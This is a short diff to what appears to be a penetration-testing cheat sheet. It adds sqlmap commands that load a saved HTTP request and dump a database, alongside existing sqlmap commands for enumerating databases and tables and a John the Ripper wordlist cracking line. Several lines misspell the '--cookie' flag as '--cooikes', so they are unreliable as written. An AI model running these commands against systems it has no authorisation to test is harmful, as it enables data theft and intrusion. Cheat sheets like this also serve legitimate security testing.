@@ -94,7 +94,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt <Filename>
 數字0  
 # sqlmap #  
 ```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```   
-```sqlmap -u "www.example.com" --cooikes=<cookies>  --dump  ```  
+```sqlmap -r <request.filename> --dump  ```  
+```sqlmap -r <request.filename> --dump  --level 2```  
 ```sqlmap -u "www.example.com" --cooikes=<cookies>  --dbs  ```  
 ```sqlmap -u "www.example.com" --cooikes=<cookies>  -D [Database name] --tables  ```  
 
